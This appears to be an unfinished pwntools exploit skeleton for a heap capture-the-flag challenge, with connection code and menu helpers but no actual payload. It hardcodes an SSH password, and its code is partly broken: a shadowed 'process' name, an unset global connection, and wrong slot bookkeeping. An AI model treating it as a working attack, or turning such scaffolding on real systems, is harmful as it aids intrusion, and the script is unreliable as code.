# this is done with null byte poisoning
from pwn import *

exe = ELF("./pkm_nopie_patched")
libc = ELF("./libc-2.27_notcache.so")
ld = ELF("./ld-2.27.so")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h']

def conn():
    if args.LOCAL:
        host = "acidburn"
        ip = "127.0.0.1"

        category = "heap"
        proc = "pkm"
        path = "/challenges/"+category+"/"+proc+"/"
        #prt = int(input(" insert "+host+"'s port to connect to:"))
        prt=3022
        #pwd = getpass("insert "+host+"'s password:")
        pwd="0607991337"
        process = "."+path+proc+"_nopie"
        print("Connecting to "+host+" at "+ip+" to execute syscall")
        ssh_p = ssh(host,ip,password=pwd,port= prt)
        gdbc = '''
                    set environment LD_PRELOAD ./libc-2.27_notcache.so
                    start
               '''
        if ( sys.argv[1] == 'gdb') :
            p = gdb.debug( [process], ssh = ssh_p, gdbscript = gdbc )
        else:
            p = process([exe.path])
    else:
        p = remote("bin.training.jinblack.it",2025)#insert here
    return p

free=[0]*50
def find_index():
    global free
    for i in range(50):
        if(free[i]==0):
            return i
def new():
    global free
    p.recvuntil(b">")
    try:
        p.sendline(b"0")
    except:
        print("Error new")
    index=find_index()
    free[index]=1
    return index
def rename(i,size,content):
    p.recvuntil(b">")
    try:
        p.sendline(b"1")
        p.sendline(b"%d"%i)
        p.recvuntil(b":")
        p.sendline(b"%d"%size)
        p.send(content)
    except:
        print("Error writing")
def delete(i):
    global free
    try:
        p.recvuntil(b">")
        p.sendline(b"2")
        p.recvuntil(b">")
        p.sendline(b"%d"%i)
        free[i]=1
    except:
        print("Errore delete")
def info(i):
    p.recvuntil(b">")
    try:
        p.sendline(b"4")
        p.recvuntil(b">")
        p.sendline(b"%d"%i)
        line=p.recvline()
        name=line[9:-1]
        line=p.recvline()
        attack=line[8:-1]
        return {"name": name, "attack":attack}
    except:
        print("Errore free")
    return name
def main():
    p = conn()


    p.interactive()

if __name__ == "__main__":
    main()
